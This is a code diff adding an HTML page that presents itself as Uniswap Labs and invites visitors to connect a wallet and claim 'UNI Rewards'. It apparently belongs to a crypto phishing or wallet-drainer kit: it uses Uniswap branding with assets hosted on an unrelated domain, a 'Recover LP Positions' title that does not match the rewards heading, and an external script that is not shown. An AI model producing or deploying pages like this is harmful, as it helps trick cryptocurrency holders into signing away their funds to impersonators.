@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Uniswap Labs | Recover LP Positions</title>
+  <link rel="icon" type="image/webp" href="https://picui.ogmua.cn/s1/2026/03/15/69b653a2eddbd.webp">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <header class="header">
+    <div class="header-left">
+      <a href="/" class="logo-link">
+        <img src="https://picui.ogmua.cn/s1/2026/03/15/69b653a2eddbd.webp" alt="Uniswap" class="logo">
+        <span class="brand">Uniswap Labs</span>
+      </a>
+    </div>
+    <div class="header-right">
+      <div class="chain-dropdown">
+        <button id="chain-toggle" class="chain-toggle" aria-haspopup="listbox" aria-expanded="false">
+          <span id="chain-label">Base</span>
+          <svg class="chevron" width="12" height="12" viewBox="0 0 12 12" fill="none"><path d="M3 4.5L6 7.5L9 4.5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        </button>
+        <ul id="chain-menu" class="chain-menu" role="listbox">
+          <li role="option" data-chain="8453">Base</li>
+          <li role="option" data-chain="1">Ethereum</li>
+        </ul>
+      </div>
+      <span id="addr" class="addr"></span>
+      <button id="connect-btn" class="connect-btn">Connect Wallet</button>
+    </div>
+  </header>
+
+  <main class="main">
+    <div class="content-card">
+      <h1 class="page-title">Check Eligibility for UNI Rewards</h1>
+      <p class="page-desc">Connect your wallet to verify eligibility and submit your reward claim.</p>
+
+      <div class="claim-card">
+        <button id="claim-btn" class="claim-btn">Get Started</button>
+        <p id="claim-status" class="claim-status" style="display:none;"></p>
+      </div>
+    </div>
+
+    <div class="content-card pool-card">
+      <h2 class="card-title">Claim Activity</h2>
+      <p id="pool-list-empty" class="empty-msg">Connect wallet to view claim details</p>
+      <div id="position-list" class="position-list"></div>
+    </div>
+
+    <div class="content-card lp-explore-card">
+      <h2 class="card-title">Explore Pools</h2>
+      <p class="card-desc">Supported liquidity pools on <span id="lp-chain-name">Base</span></p>
+      <div id="lp-pool-list" class="lp-pool-list"></div>
+    </div>
+  </main>
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>
+  <script type="module" src="dist/script.js"></script>
+</body>
+</html>
